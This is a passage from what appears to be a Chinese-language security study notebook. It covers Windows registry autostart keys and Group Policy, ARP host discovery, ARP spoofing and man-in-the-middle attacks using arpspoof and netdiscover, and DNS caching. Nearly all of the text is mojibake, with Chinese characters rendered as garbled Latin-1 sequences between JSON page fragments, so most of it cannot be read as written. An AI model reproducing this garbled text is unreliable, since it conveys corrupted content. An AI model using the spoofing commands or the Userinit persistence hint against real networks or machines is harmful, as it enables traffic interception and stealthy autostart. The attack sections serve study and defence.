å…¶ä»–åº•å±‚çš„ç³»ç»ŸçŠ¶æ€ä¿¡æ¯ï¼Œä»¥åŠå…¶ä»–æ•°æ®ç­‰ã€‚æ³¨å†Œè¡¨ä¸­è¿˜åŒ…å« Windows åœ¨è¿è¡ŒæœŸé—´ä¸æ–­å¼•ç”¨çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œæ¯ä¸ªç”¨æˆ·çš„é…ç½®æ–‡ä»¶ã€è®¡ç®—æœºä¸Šå®‰è£…çš„åº”ç”¨ç¨‹åºä»¥åŠæ¯ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥åˆ›å»ºçš„æ–‡æ¡£ç±»å‹ã€æ–‡ä»¶å¤¹å’Œåº”ç”¨ç¨‹åºå›¾ æ ‡çš„å±æ€§è¡¨è®¾ç½®ã€ç³»ç»Ÿä¸Šå­˜åœ¨å“ªäº›ç¡¬ä»¶ä»¥åŠæ­£åœ¨ä½¿ç”¨å“ªäº›ç«¯å£ã€‚å½“ä¸€ä¸ªç”¨æˆ·å‡†å¤‡è¿è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œæ³¨å†Œè¡¨æ ä¾›åº”ç”¨ç¨‹åºä¿¡æ¯ç»™æ“ä½œç³»ç»Ÿï¼Œè¿™æ ·åº”ç”¨ç¨‹åºå¯ä»¥è¢«æ‰¾åˆ°ï¼Œæ­£ç¡®æ•°æ®æ–‡ä»¶çš„ä½ç½®è¢«è§„å®šï¼Œå…¶ä»–è®¾ç½®ä¹Ÿéƒ½å¯ä»¥è¢«ä½¿ç”¨ã€‚ æ­£å¸¸æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ç‚¹å‡»å¼€å§‹èœå•å½“ä¸­çš„è¿è¡Œï¼Œç„¶åè¾“å…¥regeditæˆ–regedit.exeç‚¹å‡»ç¡®å®šå°±èƒ½æ‰“å¼€ Windowsæ“ä½œç³»ç»Ÿè‡ªå¸¦çš„æ³¨å†Œè¡¨ç¼–è¾‘å™¨äº†ï¼Œå‹æƒ…æ…é‡æé†’ï¼Œæ“ä½œæ³¨å†Œè¡¨æœ‰å¯èƒ½é€ æˆç³»ç»Ÿæ•…éšœï¼Œè‹¥æ‚¨æ˜¯å¯¹ Windowsæ³¨å†Œè¡¨ä¸ç†Ÿæ‚‰ã€ä¸äº†è§£æˆ–æ²¡æœ‰ç»éªŒçš„Windowsæ“ä½œç³»ç»Ÿç”¨æˆ·å»ºè®®å°½é‡ä¸è¦éšæ„æ“ä½œæ³¨å†Œè¡¨ï¼Œå³ä¾¿æ˜¯å¿…é¡»è¦æ“ä½œï¼Œé‚£ä¹ˆä¹Ÿè¦æå‰åšå¥½æ³¨å†Œè¡¨çš„å¤‡ä»½å·¥ä½œã€‚å¦‚æœä¸Šè¿°æ‰“å¼€æ³¨å†Œè¡¨çš„æ–¹æ³•ä¸èƒ½ä½¿ç”¨ï¼Œè¯´æ˜ä½ æ²¡æœ‰ç®¡ç†å‘˜æƒ é™ï¼Œæˆ–è€…æ³¨å†Œè¡¨è¢«é”å®šï¼Œå¦‚æœæ˜¯æ²¡æœ‰æƒé™ï¼Œé‚£ä¹ˆæƒ³åŠæ³•è§£é”æƒé™ã€‚ ç®€å•æ¥è¯´ï¼šæ³¨å†Œè¡¨æ˜¯windowsç³»ç»Ÿæ¥è®°å½•å’Œä¿®æ”¹ç”¨æˆ·è®¾ç½®çš„ï¼Œä¸è®ºæ˜¯è½¯ä»¶è¿˜æ˜¯ç¡¬ä»¶ã€‚ æ³¨å†Œè¡¨çš„æ•°æ®ç»“æ„ï¼š æ³¨å†Œè¡¨ç”±é¡¹ï¼ˆä¹Ÿå«ä¸»é”®æˆ–ç§°â€œé”®â€ï¼‰ã€å­é¡¹ï¼ˆå­é”®ï¼‰å’Œå€¼æ„æˆã€‚ä¸€ä¸ªé¡¹å°±æ˜¯åˆ†æ”¯ä¸­çš„ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè€Œå­é¡¹å°± æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹å½“ä¸­çš„å­æ–‡ä»¶å¤¹ï¼Œå­é¡¹åŒæ ·å®ƒä¹Ÿæ˜¯ä¸€ä¸ªé¡¹ã€‚ä¸€ä¸ªå€¼åˆ™æ˜¯ä¸€ä¸ªé¡¹çš„å½“å‰å®šä¹‰ï¼Œç”±åç§°ã€æ•°æ®ç±»å‹ä»¥ åŠåˆ†é…çš„å€¼ç»„æˆã€‚ä¸€ä¸ªé¡¹å¯ä»¥æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå€¼ï¼Œæ¯ä¸ªå€¼çš„åç§°å„ä¸ç›¸åŒï¼Œå¦‚æœä¸€ä¸ªå€¼çš„åç§°ä¸ºç©ºï¼Œåˆ™è¯¥å€¼ä¸ºè¯¥ é¡¹çš„é»˜è®¤å€¼ã€‚ åœ¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨ï¼ˆregedit.exeï¼‰ä¸­ï¼Œæ•°æ®ç»“æ„æ˜¾ç¤ºå¦‚ä¸‹ï¼Œå…¶ä¸­ï¼Œcommandé”®æ˜¯opené¡¹çš„å­é¡¹ï¼Œ(é»˜ è®¤)è¡¨ç¤ºè¯¥å€¼æ˜¯é»˜è®¤å€¼ï¼Œå€¼åç§°ä¸ºç©ºï¼Œå…¶æ•°æ®ç±»å‹ä¸ºREG_SZï¼Œæ•°æ®å€¼ ä¸º%systemroot%/system32/notepad.exe\"%1æ•°æ®ç±»å‹ã€‚ æ³¨å†Œè¡¨çš„æ•°æ®ç±»å‹ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼šæ˜¾ç¤ºç±»å‹ï¼ˆåœ¨ç¼–è¾‘å™¨ä¸­ï¼‰æ•°æ®ç±»å‹è¯´æ˜ REG_SZï¼šå­—ç¬¦ä¸²ï¼šæ–‡æœ¬å­—ç¬¦ä¸² REG_MULTI_SZï¼šå¤šå­—ç¬¦ä¸²å€¼ï¼šå«æœ‰å¤šä¸ªæ–‡æœ¬å€¼çš„å­—ç¬¦ä¸² REG_BINARYï¼šäºŒè¿›åˆ¶æ•°ï¼šäºŒè¿›åˆ¶å€¼ï¼Œä»¥åå…­è¿›åˆ¶æ˜¾ç¤ºï¼Œ REG_DWORDï¼šåŒå­—å€¼ï¼›ä¸€ä¸ª32ä½çš„äºŒè¿›åˆ¶å€¼ï¼Œæ˜¾ç¤ºä¸º8ä½çš„åå…­è¿›åˆ¶å€¼ã€‚ win+ré”®ï¼Œè¿è¡Œï¼Œè¾“å…¥regeditï¼Œå³å¯çœ‹åˆ°æ³¨å†Œè¡¨ æ³¨å†Œè¡¨ä¸­å…³äºå¼€æœºå¯åŠ¨é¡¹çš„é…ç½®ä½ç½®åœ¨è¿™é‡Œ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run å¯¹äºwin10æ¥è®²çš„å¸¸è§ä½ç½®ï¼š HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run å…¶ä»–ä½ç½®ï¼šè¿™äº›å¤§è‡´äº†è§£å³å¯ï¼Œåé¢ç”¨åˆ°å“ªä¸ªå°±è¯´å“ªä¸ªã€‚ Loadæ³¨å†Œé”®ï¼šHKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼WindowsNTï¼¼CurrentVersionï¼¼ Windowsï¼¼load Userinitæ³¨å†Œé”®ï¼šHKEY_LOCAL_MACHINEï¼¼SOFTWAREï¼¼Microsoftï¼¼WindowsNTï¼¼ CurrentVersionï¼¼Winlogonï¼¼Userinitè¿™é‡Œä¹Ÿèƒ½å¤Ÿä½¿ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨åˆå§‹åŒ–ç¨‹åºã€‚é€šå¸¸è¯¥æ³¨å†Œé”®ä¸‹é¢æœ‰ ä¸€ä¸ªuserinit.exeï¼Œä½†è¿™ä¸ªé”®å…è®¸æŒ‡å®šç”¨é€—å·åˆ†éš”çš„å¤šä¸ªç¨‹åºï¼Œä¾‹å¦‚â€œuserinit.exe,OSA.exeâ€(ä¸å«å¼• å·)ã€‚ ç­‰ç­‰.. å‘½ä»¤è¡Œæ·»åŠ æ³¨å†Œè¡¨é€‰é¡¹ reg add HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings /v dms /t REG_SZ /d test /f æ³¨ï¼šreg å‘½ä»¤;add å¢åŠ ; /v é€‰é¡¹; /t ç±»å‹ ;/d å€¼;/f ä¸ç”¨æç¤ºå°±å¼ºè¡Œè¦†ç›–ç°æœ‰æ³¨å†Œè¡¨é¡¹ Windowå®‰å…¨ç»„ç­–ç•¥ 1ã€å®šä¹‰ ç™¾åº¦ç™¾ç§‘ï¼šç»„ç­–ç•¥ï¼ˆè‹±è¯­ï¼šGroup Policyï¼‰æ˜¯å¾®è½¯Windows NTå®¶æ—æ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå¯ä»¥æ§åˆ¶ç”¨æˆ· å¸æˆ·å’Œè®¡ç®—æœºå¸æˆ·çš„å·¥ä½œç¯å¢ƒã€‚ç»„ç­–ç•¥æä¾›äº†æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºå’Œæ´»åŠ¨ç›®å½•ä¸­ç”¨æˆ·è®¾ç½®çš„é›†ä¸­åŒ–ç®¡ç†å’Œé… ç½®ã€‚ç»„ç­–ç•¥çš„å…¶ä¸­ä¸€ä¸ªç‰ˆæœ¬åä¸ºæœ¬åœ°ç»„ç­–ç•¥ï¼ˆç¼©å†™â€œLGPOâ€æˆ–â€œLocalGPOâ€ï¼‰ï¼Œè¿™å¯ä»¥åœ¨ç‹¬ç«‹ä¸”éåŸŸçš„è®¡ç®—æœºä¸Š ç®¡ç†ç»„ç­–ç•¥å¯¹è±¡ã€‚ é€šä¿—è§£é‡Šï¼šç»„ç­–ç•¥æ˜¯ä¸€ç»„ç­–ç•¥çš„é›†åˆï¼Œç­–ç•¥å°±æ˜¯åˆ¶å®šçš„è§„åˆ™ã€‚ç»„ç­–ç•¥æ˜¯å°†ç³»ç»Ÿé‡è¦çš„é…ç½®åŠŸèƒ½æ±‡é›†æˆå„ç§é…ç½® æ¨¡å—ï¼Œä¾›ç”¨æˆ·ç›´æ¥ä½¿ç”¨ï¼Œä»è€Œè¾¾åˆ°æ–¹ä¾¿ç®¡ç†è®¡ç®—æœºçš„ç›®çš„ã€‚ç®€å•ç‚¹è¯´ï¼Œç»„ç­–ç•¥å°±æ˜¯ä¿®æ”¹æ³¨å†Œè¡¨ä¸­çš„é…ç½®ã€‚å½“ ç„¶ï¼Œç»„ç­–ç•¥ä½¿ç”¨è‡ªå·±æ›´å®Œå–„çš„ç®¡ç†ç»„ç»‡æ–¹æ³•ï¼Œå¯ä»¥å¯¹å„ç§å¯¹è±¡ä¸­çš„è®¾ç½®è¿›è¡Œç»Ÿä¸€çš„ç®¡ç†å’Œé…ç½®ï¼Œè¿œæ¯”æ‰‹å·¥ä¿®æ”¹ æ³¨å†Œè¡¨æ–¹ä¾¿ã€çµæ´»ï¼ŒåŠŸèƒ½ä¹Ÿæ›´åŠ å¼ºå¤§ æ‰“å¼€æœ¬åœ°ç»„ç­–ç•¥çš„æ–¹å¼ win+ré”®ï¼Œè¿è¡Œ gpedit.msc Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-11-28 17:27:04 "},"07.åŸºç¡€çŸ¥è¯†/è®¡ç®—æœºç½‘ç»œ/ARPåè®®.html":{"url":"07.åŸºç¡€çŸ¥è¯†/è®¡ç®—æœºç½‘ç»œ/ARPåè®®.html","title":"ARPåè®®","keywords":"","body":"ARPåè®®æ˜¯ä»€ä¹ˆ â€‹ ARP åè®®æ˜¯åœ°å€è§£æåè®®ã€‚å®ƒçš„ä½œç”¨æ˜¯ï¼Œé€šè¿‡IPåœ°å€ï¼ˆèº«ä»½è¯å·ï¼‰ï¼Œé—®å‡ºMACåœ°å€ï¼ˆåå­—ï¼‰ã€‚ â€‹ æ¯”å¦‚è¯´ï¼Œä¸€ä¸ªç½‘ç»œï¼Œæœ‰Aã€Bã€C å’Œ Då››ä¸ªè®¾å¤‡ï¼Œè¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„è®¾å¤‡ï¼Œå®ƒæ˜¯è·¯ç”±å™¨ã€‚æ¯ä¸ªè®¾å¤‡æœ‰ IP åœ°å€å’Œ MAC åœ°å€ã€‚ å‡è®¾ï¼Œè®¾å¤‡A éœ€è¦å‘é€æ•°æ®åŒ…ç»™è®¾å¤‡Cï¼Œè®¾å¤‡Açš„åº”ç”¨ç¨‹åºåªçŸ¥é“è¦å‘é€æ•°æ®ç»™10.0.2.6è¿™ä¸ªipï¼Œä½†æ˜¯å‘ä¸å‡ºå»ã€‚ è¿™æ˜¯å› ä¸ºï¼ŒIPåœ°å€ç±»ä¼¼èº«ä»½è¯å·ï¼Œåœ¨å…¨å›½èŒƒå›´å†…ï¼Œå®ƒå¾ˆå¥½ç”¨ï¼Œä½†åœ¨å®¶åº­èŒƒå›´å†…ä¸çµã€‚MACç±»ä¼¼åå­—ï¼Œåœ¨å…¨å›½èŒƒå›´å†…ä¸çµï¼Œä½†å®¶åº­å†…éƒ¨ï¼Œè¿˜å¾—é è¿™ä¸ªã€‚ â€‹ åŒæ ·ï¼Œå±€åŸŸç½‘å†…éƒ¨é€šä¿¡ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡æ™®é€šäºŒå±‚äº¤æ¢æœºé€šä¿¡ï¼ŒIP(èº«ä»½è¯å·)ä¸çµï¼Œå¾—ä¾é MAC(åå­—)ã€‚Aå¿…é¡»çŸ¥é“10.0.2.6çš„MACåœ°å€ï¼Œæ‰èƒ½å°†æ•°æ®åŒ…å‘é€å‡ºå»ã€‚ç„¶è€Œï¼Œè®¾å¤‡Aæ€ä¹ˆçŸ¥é“è®¾å¤‡Cçš„MACå‘¢ï¼Ÿè¿™å°±è¦ä¾é  ARP åè®®ã€‚ ARPåè®®å¦‚ä½•å®ç° â€‹ è®¾å¤‡Aå‘é€ä¸€ä¸ªå¹¿æ’­åŒ…ï¼Œå®ƒå°±æ˜¯ARP åŒ…ï¼Œé—®æ‰€æœ‰è®¾å¤‡ï¼š 10.0.2.6(èº«ä»½è¯å·)æ˜¯è°çš„ï¼Ÿæˆ–è®¸æœ‰å–„äºæ€è€ƒçš„äººä¼šé—®ï¼Œæ­¤æ—¶Aä¸çŸ¥é“å…¶ä»–æœºå™¨çš„macåœ°å€ï¼Œæ€ä¹ˆå‘æ•°æ®åŒ…ï¼Ÿæˆ‘å›ç­”ï¼šå¹¿æ’­åŒ…æ˜¯æ™®å‘ï¼Œæ—¢ç„¶æ™®å‘ï¼Œå½“ç„¶æ— éœ€çŸ¥é“æ¥æ”¶æ–¹çš„macåœ°å€ã€‚ å…¶ä»–è®¾å¤‡éƒ½ä¸äºˆç†ç¬ï¼Œè®¾å¤‡CçŸ¥é“è‡ªå·±çš„IPæ˜¯10.0.2.6ï¼Œæ‰€ä»¥ï¼Œå®ƒç«‹å³åšå‡ºå›åº”ã€‚ â€‹ æ­£å¸¸æƒ…å†µä¸‹ï¼Œå…¶ä»–çš„è®¾å¤‡éƒ½é»˜ä¸ä½œå£°ï¼Œåªæœ‰è®¾å¤‡Cï¼Œå®ƒä¼šå‘å‡ºåº”ç­”åŒ…ã€‚å–„äºæ€è€ƒçš„äººæ­¤æ—¶åˆä¼šé—®ï¼šCä¸çŸ¥é“Açš„macåœ°å€ï¼Œæ€ä¹ˆå›åº”ï¼Ÿé”™ï¼šAå‘é€çš„å¹¿æ’­åŒ…ä¸­å¸¦æœ‰è‡ªå·±çš„macåœ°å€ï¼Œæ‰€ä»¥ï¼ŒCæ­¤æ—¶å·²ç»æœ‰äº†Açš„macåœ°å€ã€‚å›åº”åŒ…å°±åƒä¸€å¼ èº«ä»½è¯ï¼šä¸€è¡Œæ˜¯èº«ä»½è¯å·ipï¼Œä¸‹ä¸€è¡Œæ˜¯å§“åmacã€‚å°±è¿™æ ·ï¼Œè®¾å¤‡Aé€šè¿‡è¯¢é—®ï¼Œæ‹¿åˆ°äº†è®¾å¤‡Cçš„MACï¼ŒäºŒè€…å°±å¯ä»¥åœ¨å±€åŸŸç½‘ä¸­è¿›è¡Œé€šä¿¡äº†ã€‚ è¿™é‡Œå°±å‡ºç°å¦ä¸€ä¸ªé—®é¢˜ï¼šæ˜¯ä¸æ˜¯æ¯å‘é€ä¸€æ¬¡éƒ½å¾—ç»è¿‡å¹¿æ’­ -> å°è£… ARP å“åº” -> è¿”å›ç»™ä¸»æœºè¿™ä¸€ç³»åˆ—æµç¨‹å‘¢ï¼Ÿ â€‹ ç­”æ¡ˆæ˜¯ï¼šARPè¡¨ â€‹ ä¸»æœºé€šè¿‡æŠŠç¬¬ä¸€æ¬¡ ARP è·å–åˆ°çš„ MAC åœ°å€ä½œä¸º IP å¯¹ MAC çš„æ˜ å°„å…³ç³»åˆ°ä¸€ä¸ª ARP ç¼“å­˜è¡¨ä¸­ï¼Œä¸‹ä¸€æ¬¡å†å‘è¿™ä¸ªåœ°å€å‘é€æ•°æ®æŠ¥æ—¶å°±ä¸å†éœ€è¦é‡æ–°å‘é€ ARP è¯·æ±‚äº†ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨è¿™ä¸ªç¼“å­˜è¡¨ä¸­çš„ MAC åœ°å€è¿›è¡Œæ•°æ®æŠ¥çš„å‘é€ã€‚ ARPæ•°æ®åŒ… å®éªŒç¯å¢ƒï¼šå®¿ä¸»æœºwindow10ï¼Œè™šæ‹Ÿæœºkaiiï¼ˆnetè¿æ¥ï¼‰ å·¥å…·ï¼šwireshark é€‰æ‹©æ•è·VMnet8ç½‘å¡ã€‚ åœ¨å®¿ä¸»æœºä¸Šping 192.168.244.128 ï¼ˆping è™šæ‹Ÿæœºipåœ°å€ï¼‰ï¼Œè¿‡æ»¤ARPåè®®å¾—åˆ° å¯ä»¥çœ‹åˆ°infoçš„ä¿¡æ¯å…¶å®å°±å‘Šè¯‰æˆ‘ä»¬äº†ARPåè®®æ˜¯ç”¨æ¥å¹²å˜›çš„ã€‚ æ•°æ®åŒ…å†…å®¹ï¼Œä»¥ARPè¯·æ±‚ä¸ºä¾‹ï¼š ç¬¬ä¸€å¸§æè¿°äº†ARPæ•°æ®åŒ…çš„é•¿åº¦ï¼Œæ—¶é—´ï¼Œç±»å‹ç­‰ä¿¡æ¯ã€‚ ç¬¬äºŒå¸§æè¿°äº†æºmacåœ°å€å’Œç›®æ ‡macåœ°å€ å…¶ä¸­ç›®çš„åœ°å€ff:ff:ff:ff:ff:ffä¸ºå¹¿æ’­åœ°å€ ç¬¬ä¸‰å¸§ å¼•ç”¨å›¾ç‰‡ ARPå“åº”åŒ…ä¸»è¦ä¸åŒç‚¹å°±åœ¨äºARPæ•°æ®åŒ…ç±»å‹ä»¥åŠæºï¼Œç›®æ ‡åœ°å€ã€‚ ARPåè®®æ¢æµ‹ä¸»æœº å› ä¸ºARPçš„å·¥ä½œæµç¨‹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥æ¢æµ‹ä¸»æœºã€‚ ä½¿ç”¨netdiscoverå·¥å…·è¿›è¡Œæ¢æµ‹ netdiscover -r 192.168.244.1/24 ä¸‹å›¾ä¸ºå¦ä¸€å°è™šæ‹Ÿæœºubuntuçš„ipåœ°å€ ä¸‹å›¾ä¸ºå‘½ä»¤æ‰§è¡Œç»“æœ 192.168.244.1ä¸ºæœ¬æœº 192.168.244.2ä¸ºVMç½‘å…³ 192.168.244.129ä¸ºåŒä¸€å±€åŸŸç½‘ä¸‹çš„ä¸»æœº 192.168.244.254ä¸ºVMï¼Ÿ ARPæ”»å‡» æ¬ºéª—æ”»å‡» äº§ç”ŸåŸå›  ARPçš„ç‰¹æ€§ è®¾å¤‡å°±ç®—æ²¡æœ‰ä¸»åŠ¨å»è¯¢é—®ï¼ˆå‘å¹¿æ’­åŒ…ï¼‰ï¼Œä¹Ÿä¼šæ¥æ”¶åˆ«äººä¸»åŠ¨å‘æ¥çš„èº«ä»½è¯Šå¡ï¼ˆARPå›åº”åŒ…ï¼‰ã€‚ å¹¶ä¸”æ¥æ”¶æ—¶ä¸ä¼šå»åˆ¤æ–­çœŸå‡ï¼Œè€Œæ˜¯ç›´æ¥ä¿å­˜åˆ°ARPè¡¨ä¸­ã€‚ æ¬ºéª—ä¸»æœº Victimï¼šè™šæ‹Ÿæœºububtuæ­£å¸¸è”ç½‘ hackerï¼škaliæœºä½¿ç”¨arpspoofå·¥å…·è¿›è¡ŒARPæ¬ºéª—æ”»å‡» arpspoof -i ç½‘å¡å -t ç›®æ ‡ä¸»æœº è·¯ç”±å™¨ å‘½ä»¤çš„ç»“æœå°±æ˜¯è®©Victimçš„ARPè¡¨ä¸­å­˜å‚¨çš„è·¯ç”±å™¨macåœ°å€å˜ä¸ºhackerçš„macåœ°å€ï¼Œå³å‘é€çš„æ•°æ®åŒ…ä¼šåˆ°hackerä¸»æœºï¼Œè€Œä¸æ˜¯åˆ°è·¯ç”±å™¨ã€‚ ä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°victimæ— æ³•è®¿é—®ç½‘ç«™ï¼Œå¹¶ä¸”é€šè¿‡å‘½ä»¤arp -aæŸ¥çœ‹ARPè¡¨ä¼šå‘ç°VMç½‘å…³ï¼ˆ192.168.244.2ï¼‰çš„macåœ°å€å’Œhackerçš„macåœ°å€æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ARPæ¬ºéª—æ”»å‡»æˆåŠŸäº†ã€‚ ä¸­é—´äººæ”»å‡»--æ¬ºéª—ç½‘å…³å’Œä¸»æœº â€‹ åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šï¼Œhackerè¿˜å¯ä»¥å†å¯¹è·¯ç”±å™¨è¿›è¡ŒARPæ¬ºéª—æ”»å‡»ï¼Œè®©è·¯ç”±å™¨ä¸­Victimçš„ipæ‰€å¯¹åº”çš„MACåœ°å€å˜ä¸ºhackerçš„MACåœ°å€ï¼Œè¿™æ ·å½“Victimå‘é€æ•°æ®åŒ…çš„æ—¶å€™å°±ä¼šå…ˆå‘é€åˆ°hackeræ‰‹ä¸Šï¼Œhackerå¯ä»¥æŠŠæ•°æ®åŒ…å†ç»™è·¯ç”±å™¨ï¼Œå½“è·¯ç”±å™¨æ”¶åˆ°å“åº”çš„æ•°æ®åŒ…æ—¶ï¼Œå°±ä¼šè½¬å‘ç»™hackerï¼Œè¿™æ ·hackerå°±èƒ½å¤Ÿç›‘æ§å¹¶æ›´æ”¹Victimçš„é€šä¿¡äº†ã€‚ é˜²å¾¡ ç»‘å®šmacåœ°å€ ä½¿ç”¨é™æ€arpç¼“å­˜è¡¨ å‚è€ƒæ–‡ç«  ARPåè®® ARPæ¬ºéª— Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:08:42 "},"07.åŸºç¡€çŸ¥è¯†/è®¡ç®—æœºç½‘ç»œ/DNSåè®®.html":{"url":"07.åŸºç¡€çŸ¥è¯†/è®¡ç®—æœºç½‘ç»œ/DNSåè®®.html","title":"DNSåè®®","keywords":"","body":"DNSåè®®ä»‹ç» DNSï¼ˆDomain Name Systemï¼‰åè®®ä½äºISOå‚è€ƒæ¨¡å‹çš„åº”ç”¨å±‚ã€‚åœ¨ISOå‚è€ƒæ¨¡å‹ä¸­ï¼Œåº”ç”¨å±‚æ˜¯æœ€é«˜å±‚ï¼Œè´Ÿè´£æä¾›ç½‘ç»œæœåŠ¡å’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„æ¥å£ã€‚ DNSåè®®çš„ä¸»è¦åŠŸèƒ½æ˜¯å°†åŸŸåè§£æä¸ºIPåœ°å€ã€‚å½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªåŸŸåæ—¶ï¼Œä¾‹å¦‚\"example.com\"ï¼Œæµè§ˆå™¨ä¼šå‘é€ä¸€ä¸ªDNSæŸ¥è¯¢è¯·æ±‚åˆ°æœ¬åœ°DNSæœåŠ¡å™¨ã€‚æœ¬åœ°DNSæœåŠ¡å™¨é€šè¿‡DNSåè®®å‘ä¸Šçº§DNSæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œé€çº§æŸ¥è¯¢ï¼Œç›´è‡³æ‰¾åˆ°ä¸åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œå¹¶è¿”å›ç»™ç”¨æˆ·çš„è®¾å¤‡ã€‚è¿™æ ·ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡åŸŸåæ¥è®¿é—®äº’è”ç½‘ä¸Šçš„èµ„æºï¼Œè€Œä¸éœ€è¦è®°ä½å¤æ‚çš„IPåœ°å€ã€‚ DNSåè®®æ”¯æŒUDPå’ŒTCPï¼Œç«¯å£å·ä¸º53 åŸŸååˆ†ç±» DNS TTL TTLå€¼å…¨ç§°æ˜¯â€œç”Ÿå­˜æ—¶é—´ï¼ˆTime To Live)â€ï¼Œç®€å•çš„è¯´å®ƒè¡¨ç¤ºDNSè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šç¼“å­˜æ—¶é—´ï¼Œæ•°å€¼è¶Šå°ï¼Œä¿®æ”¹è®°å½•å„åœ°ç”Ÿæ•ˆæ—¶é—´è¶Šå¿«ã€‚ å½“å„åœ°çš„DNS(LDNS)æœåŠ¡å™¨æ¥å—åˆ°è§£æè¯·æ±‚æ—¶ï¼Œå°±ä¼šå‘åŸŸåæŒ‡å®šçš„æˆæƒDNSæœåŠ¡å™¨å‘å‡ºè§£æè¯·æ±‚ä»è€Œè·å¾—è§£æè®°å½•ï¼›è¯¥è§£æè®°å½•ä¼šåœ¨DNS(LDNS)æœåŠ¡å™¨ä¸­ä¿å­˜ä¸€æ®µæ—¶é—´ï¼Œè¿™æ®µæ—¶é—´å†…å¦‚æœå†æ¥åˆ°è¿™ä¸ªåŸŸåçš„è§£æè¯·æ±‚ï¼ŒDNSæœåŠ¡å™¨å°†ä¸å†å‘æˆæƒDNSæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›åˆšæ‰è·å¾—çš„è®°å½•ï¼›è€Œè¿™ä¸ªè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šä¿ç•™çš„æ—¶é—´ï¼Œå°±æ˜¯TTLå€¼ã€‚ å¸¸è§çš„è®¾ç½®TTLå€¼çš„åœºæ™¯ï¼š â€¢ å¢å¤§TTLå€¼ï¼Œä»¥èŠ‚çº¦åŸŸåè§£ææ—¶é—´ â€¢ å‡å°TTLå€¼ï¼Œå‡å°‘æ›´æ–°åŸŸåè®°å½•æ—¶çš„ä¸å¯è®¿é—®æ—¶é—´ æµè§ˆå™¨DNSè§£ææµç¨‹ å› ä¸ºæ¯æ¬¡è¯·æ±‚æ—¶éƒ½å‘DNSæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ï¼Œè¿‡äºæµªè´¹èµ„æºï¼Œæ‰€ä»¥å‡ºç°äº†DNSç¼“å­˜ã€‚ æµè§ˆå™¨DNSæŸ¥æ‰¾é¡ºåºä¸€èˆ¬æ˜¯è¿™æ ·çš„: æµè§ˆå™¨DNSç¼“å­˜->æœ¬åœ°ç³»ç»ŸDNSç¼“å­˜->æœ¬åœ°è®¡ç®—æœºHOSTSæ–‡ä»¶->è·¯ç”±å™¨DNSç¼“å­˜->ISPçš„DNSç¼“å­˜->æ ¹æœåŠ¡å™¨é€’å½’æœç´¢ æµè§ˆå™¨DNSç¼“å­˜ï¼ˆå†…å­˜ä¸­) æµè§ˆå™¨ä¼šæŒ‰ç…§ä¸€å®šé¢‘ç‡ç¼“å­˜DNSè®°å½• æŸ¥çœ‹googleæµè§ˆå™¨DNSç¼“å­˜ æœ¬åœ°DNSç¼“å­˜(å†…å­˜ä¸­) æŸ¥çœ‹ï¼šipconfig /displaydns æ¸…é™¤ï¼šipconfig /flushdns æœ¬åœ°HOSTSæ–‡ä»¶ c:\\windows\\system32\\drivers\\etc\\hosts è·¯ç”±å™¨DNSç¼“å­˜ è·¯ç”±å™¨DNSè¢«ç¯¡æ”¹ä¼šé€ æˆåŸŸååŠ«æŒï¼Œä½ è®¿é—®çš„ç½‘å€éƒ½ä¼šè¢«å®šä½åˆ°åŒä¸€ä¸ªä½ç½®ï¼Œä½†æ˜¯IPç›´æ¥å¯ä»¥è®¿é—® ISPçš„DNSæœåŠ¡å™¨ å…¬å…±æœåŠ¡å™¨ 8.8.8.8 (Google æä¾›) 114.114.114.114 (å›½å†…å…¬å…± DNS) ä¸“ç”¨æœåŠ¡å™¨ æ ¹æœåŠ¡å™¨ ä»¥è®¿é—®www.baidu.comä¸ºä¾‹ï¼Œ DNSæœåŠ¡å™¨å…ˆé—®æ ¹åŸŸåæœåŠ¡å™¨.comåŸŸåæœåŠ¡å™¨çš„IPåœ°å€ï¼Œç„¶åå†é—®.comåŸŸåæœåŠ¡å™¨ï¼Œä»¥æ­¤ç±»æ¨ è®¾ç½®DNSè§£æ ä»¥é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸ºä¾‹ ä¸»æœºè®°å½• 